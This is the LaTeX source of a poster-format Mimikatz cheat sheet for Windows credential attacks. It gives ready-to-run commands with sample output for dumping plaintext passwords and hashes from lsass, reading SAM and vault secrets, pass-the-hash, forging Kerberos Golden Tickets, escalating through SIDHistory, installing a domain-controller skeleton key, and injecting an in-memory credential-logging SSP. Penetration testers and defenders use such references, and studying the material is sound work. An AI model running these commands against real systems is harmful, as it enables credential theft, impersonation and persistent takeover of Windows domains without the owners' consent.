%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% MIMIKatz Cheat Sheet
%
% Edited by Nicholas Brink nic@brinksite.com
%
% baposter Landscape Poster
% This template has been downloaded from:
% http://www.LaTeXTemplates.com
% 
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%----------------------------------------------------------------
%	PACKAGES AND OTHER DOCUMENT CONFIGURATIONS
%----------------------------------------------------------------

\documentclass[landscape,a0paper,fontscale=0.285]{baposter} % Adjust the font scale/size here
 \title{MIMIKatz Cheat Sheet New}
\usepackage[english]{babel}
\usepackage[utf8]{inputenc}

\usepackage{graphicx} % Required for including images
\graphicspath{{figures/}} % Directory in which figures are stored

\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{tabu}

\usepackage{mathtools}
%\usepackage{amsmath} % For typesetting math
\usepackage{amssymb} % Adds new symbols to be used in math mode

\usepackage{booktabs} % Top and bottom rules for tables
\usepackage{enumitem} % Used to reduce itemize/enumerate spacing
\usepackage{palatino} % Use the Palatino font
\usepackage[font=small,labelfont=bf]{caption} % Required for specifying captions to tables and figures

\usepackage{multicol} % Required for multiple columns
\setlength{\columnsep}{1.5em} % Slightly increase the space between columns
\setlength{\columnseprule}{0mm} % No horizontal rule between columns

\usepackage{tikz} % Required for flow chart
\usepackage{hyperref} % Required for URLS
\usepackage{listings} % Required for listings
\usepackage{verbatim} %required for code sections
\usetikzlibrary{decorations.pathmorphing}
\usetikzlibrary{shapes,arrows} % Tikz libraries required for the flow chart in the template

\newcommand{\compresslist}{ % Define a command to reduce spacing within itemize/enumerate environments, this is used right after \begin{itemize} or \begin{enumerate}
\setlength{\itemsep}{1pt}
\setlength{\parskip}{0pt}
\setlength{\parsep}{0pt}
}
\definecolor{orange}{RGB}{255,127,0}% Defines the color used for content box headers
 %\definecolor{lightblue}{rgb}{0.145,0.6666,1} 

\begin{document}

\begin{poster}
{
headerborder=closed, % Adds a border around the header of content boxes
colspacing=0.8em, % Column spacing
bgColorOne=white, % Background color for the gradient on the left side of the poster
bgColorTwo=white, % Background color for the gradient on the right side of the poster
borderColor=orange, % Border color
headerColorOne=black, % Background color for the header in the content boxes (left side)
headerColorTwo=orange, % Background color for the header in the content boxes (right side)
headerFontColor=white, % Text color for the header text in the content boxes
boxColorOne=white, % Background color of the content boxes
textborder=roundedleft, % Format of the border around content boxes, can be: none, bars, coils, triangles, rectangle, rounded, roundedsmall, roundedright or faded
eyecatcher=true, % Set to false for ignoring the left logo in the title and move the title left
headerheight=0.1\textheight, % Height of the header
headershape=roundedright, % Specify the rounded corner in the content box headers, can be: rectangle, small-rounded, roundedright, roundedleft or rounded
headerfont=\Large\bf\textsc, % Large, bold and sans serif font in the headers of content boxes
%textfont={\setlength{\parindent}{1.5em}}, % Uncomment for paragraph indentation
linewidth=2pt % Width of the border lines around content boxes
}
%----------------------------------------------------------------
%	Title
%----------------------------------------------------------------
{\bf\textsc{mimikatz Cheat Sheet}\vspace{0.5em}} % Poster title
{\textsc{\{ m i m i k a t z \ \ \ \ \ C h e a t \ \ \ \ \ S h e e t\} \hspace{12pt}}}
{\textsc{A little tool to play with Windows Security \\ (V1.1 edited by: Nicholas Brink) \hspace{12pt}}} 

%------------------------------------------------
% Introduction
%------------------------------------------------
\headerbox{Mimikatz Overview:}{name=objectives,column=0,row=0}{

%-------Purpose-------------------------------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf  - Purpose}}
\textbf{mimikatz} is a tool developed by Benjamin Delpy to extract plaintext passwords, hashes, PIN codes, kerberos tickets from memory. It can also be used to perform pass-the-hash, pass-the-ticket, and build Golden Tickets.\\  
\\
\textbf{mimikatz} can be downloaded from github:\\
\url{https://github.com/gentilkiwi/mimikatz}

Command Overview: \\
\hspace*{1cm}List Modules: \textit{:: [enter]} \\
\hspace*{1cm}List Commands: \textit{<modulename>:: } \\
\hspace*{0cm}Basic Syntax: \textit{<modulename>::<command> <args>} 
\\
\\
\\
%-------Modules-------------------------------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf  - Modules}} \linebreak
\centering{\textbf{mimikatz} V2.1 currently has 20 modules \\
\begin{tabular}{|l|p{4.75cm}| }
\hline
\multicolumn{2}{|c|}{\textbf{mimikatz Modules}} \\
\hline
\hspace*{.5cm}Name &  \hspace*{1.0cm}Description\\
\hline
standard & Basic commands\\
crypto & Info about providers\\
sekurlsa &  Enumerate credentials\\
kerberos & Kerberos ticket functions\\
privilege & Request rights (i.e. debug)\\
process & Interact with system processes\\
service & Interact with system services\\
lsadump & LSA: dcsync, netsync, sam, secrects\\
ts & Patch Terminal Server to allow multiple users\\
event & drop|clear Windows event log\\
misc & cmd, regedit, taskmgr, memssp, skeleton\\
token & Manipulate identity tokens\\
vault & Windows Credential Manager\\
minesweeper & Cheat at Minesweeper\\
net & user, group and alias info\\
dpapi & Data protection application programming interface\\
busylight & Control Kuando Busylight Device\\
sysenv & Interact with system enviroment variables\\
sid & Interact with Security Identifiers\\
iis & Analyze IIS .config files\\
\hline
\end{tabular}
}
%end of centering
}


%------------------------------------------------
% Credentials
%------------------------------------------------
\headerbox{Credentials}{name=introduction,column=1,row=0,bottomaligned=objectives}{
%------Priviledges--------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Privileges and Logging}}
\textbf{mimikatz} requires debug privileges which allows mimikatz to attach to the lsass process.  By default debug is granted to all administrators.  If debug permissions have been removed try: \textit{psexec -s -c mimikatz.exe} to run as the system user.\\
\hspace*{.25cm}\textit{mimikatz \# privilege::debug \\\hspace*{1.25cm}\textbf{ Privilege '20' OK}} \\
Some features may require the use of \textbf{SYSTEM} privileges:\\
\hspace*{.25cm}\textit{mimikatz \# token::elevate \\\hspace*{1.25cm}\textbf{Token Id  : 0
\\\hspace*{1.25cm}User name :
\\\hspace*{1.25cm}SID name  : NT AUTHORITY\textbackslash SYSTEM }} \\
Create a log of all the mimikatz output (default log name is "mimikatz.log"):\\
\hspace*{.25cm}\textit{mimikatz \# standard::log \textbf{optional-log-name} \\\hspace*{1.25cm}\textbf{ Using 'mimikatz.log' for logfile : OK}} \\
%------Plain Text Creds--------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Dump Plaintext Credentials}}
%\textbf{mimikatz}

Create a log of all the mimikatz output (default log name is "mimikatz.log"):\\

\hspace*{.25cm}\textit{mimikatz \# sekurlsa::logonPasswords \\\hspace*{1.25cm}\textbf{Authentication Id : 0 ;\\
\hspace*{1.25cm}Session           : Interactive from 1\\
\hspace*{1.25cm}User Name         : USERNAME\\
\hspace*{1.25cm}Domain            : DOMAIN\\
\hspace*{1.25cm}Logon Server      : LastDomainController\\
\hspace*{1.25cm}Logon Time        : 1/1/1970 9:30:47 AM\\
\hspace*{1.25cm}SID               : S-1-5-21-***}} \\
%------Cred Manager & Windows Vault--------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Additional Creds \& Keys}}
Additional creds are maintained by the Windows Credential Manager, Windows Vault and SAM:\\
\begin{tabular}{|l|p{4.25cm}| }
\hline
\hspace*{.5cm}Name &  \hspace*{1.0cm}Description\\
\hline
vault::cred & Credential Manager Creds\\
vault::list & Windows Vault Creds\\
lsadump::sam &  Key to decrypt SAM\\
lsadump::secrets & Key to decrypt SECRETS\\
lsadump::cache & Key to decrypt MSCache(v2)\\
\hline
\end{tabular}
%------Dump File--------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Dump File}}
\textbf{mimikatz} can make use of the dump of an lsass process using \textbf{procdump}:\\
\hspace*{.25cm}\textit{procdump.exe -ma lsass.exe minidump.dmp 2>\&1}
This can then be read into \textbf{mimikatz}:\\
\hspace*{.25cm}\textit{mimikatz \# sekurlsa::minidump minidump.dmp}

}

%------------------------------------------------
% Impersonation
%------------------------------------------------
\headerbox{Impersonation}{name=results,column=2,row=0,bottomaligned=objectives}{

%---------------------------------------------

%------Pass the hash--------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Pass the Hash}}
\textbf{mimikatz} can create a process running under another users credential using the HASH of a password instead of the real password.
\begin{itemize}\compresslist
\item/user - the username to impersonate
\item/domain - the FQDN - if local user/admin, use computer or server name
\item/rc4 or /ntlm - optional - the RC4 key / NTLM hash of the user's password
\item/aes128 - optional - the AES128 key derived from the user's password and the realm of the domain
\item/aes256 - optional - the AES256 key derived from the user's password and the realm of the domain
\item/run - optional - the command line to run - default is: cmd to have a shell.
\item/impersonate - optional - 
\end{itemize}
\hspace*{.25cm}\textit{mimikatz \# sekurlsa::pth /user:imauser\\ /domain:domain.net /ntlm:b8e... /run:"powershell" \\\hspace*{1.25cm}\textbf{user : imauser\\
\hspace*{1.25cm}Domain : domain.net\\
\hspace*{1.25cm}program: powershell \\
\hspace*{1.25cm}...}} \\
%------Golden Ticket--------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Golden Ticket}}
The domain name, domain SID, account name, account RID, RID's for group membership and an RC4(NTLM Hash) key, AES128 HMAC Key, or AES256 HMAC key. \textbf{mimikatz} on a DC:\\
\hspace*{.25cm}\textit{mimikatz \# lsadump::lsa /inject /name:krbtgt \\\hspace*{1.25cm}\textbf{EXTENDED OUTPUT}}\\
To generate the ticket and save for later use:\\
\hspace*{.25cm}\textit{mimikatz \# kerberos:purge}\\
\hspace*{.25cm}\textit{mimikatz \# kerberos::golden /domain:domain.net\\ /sid:S-1-5-21... /rc4:8ad3... /user:Administrator\\ /id:500 /groups:500,501,513 /ticket:forged.kirbi}\\
\hspace*{.25cm}\textit{mimikatz \# kerberos::ptt forged.kirbi}\\
Once imported, issue \textbf{misc::cmd} to use
\\
%------------------------------------------------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Elevate Privileges}} \\
The \textbf{misc::addsid} command adds a sid to the \textbf{SIDHistory} of an account. By choosing a domain admin you effectively elevate a user account to domain admin\\
\hspace*{.25cm}\textit{mimikatz \# misc::addsid normuser domainadmin} \\
}
%------------------------------------------------
% Misc
%------------------------------------------------
\headerbox{Miscellaneous}{name=results,column=3,row=0,bottomaligned=objectives}{
%---------------------------------------------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - MultiRDP}} \\
The \textbf{ts} module patches "termsrv.dll" in memory to allow for additional RDP sessions.\\ 
\hspace*{.25cm}\textit{mimikatz \# ts::multirdp \\\hspace*{1.25cm}\textbf{"TermService" service patched}} \\
%------------------------------------------------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - SkeletonKey}} \\
The \textbf{misc::skeleton} command patches "lsass" in memory on a domain controller to create a skeleton password of "mimikatz" for any domain user. A reboot of the DC is required to revert this. 
\hspace*{.25cm}\textit{mimikatz \# misc::skeleton} \\

%------------------------------------------------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - MEMSSP}} \\
\textbf{misc::memssp} adds an Security Support Provider (SSP) in memory on the local system to gather credentials of users that log in.  By default they are written to a file in the same directory as the driver.\\ 
\hspace*{.25cm}\textit{mimikatz \# misc::memssp \\\hspace*{1.25cm}\textbf{Injected =>}} \\
%------------------------------------------------
\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Kernel Commands}} \\
\centering{\textbf{mimikatz} has additional commands that can be called by prefixing them with "!" \\
\begin{tabular}{|l|p{4.4cm}| }
\hline
\multicolumn{2}{|c|}{\textbf{! Commands}} \\
\hline
\hspace*{.5cm}Name &  \hspace*{1.0cm}Description\\
\hline
+ & Install driver (mimidrv)\\
- & Remove driver (mimidrv)\\
ping & Ping the driver\\
bsod & BSOD !\\
process & List process\\
processProtect & Protect process\\
processToken & Duplicate process token\\
processPrivilege & Set all privilege on process\\
modules & List modules\\
ssdt & List SSDT\\
notifProcess & List process notify callbacks\\
notifThread & List thread notify callbacks\\
notifImage & List image notify callbacks\\
notifReg & List registry notify callbacks\\
notifObject & List object notify callbacks\\
filters & List FS filters\\
minifilters & List minifilters\\
sysenvset & System Environment Variable Set\\
sysenvdel & System Environment Variable Delete\\
\hline
\end{tabular}
\\
}
}
\end{poster}
\end{document}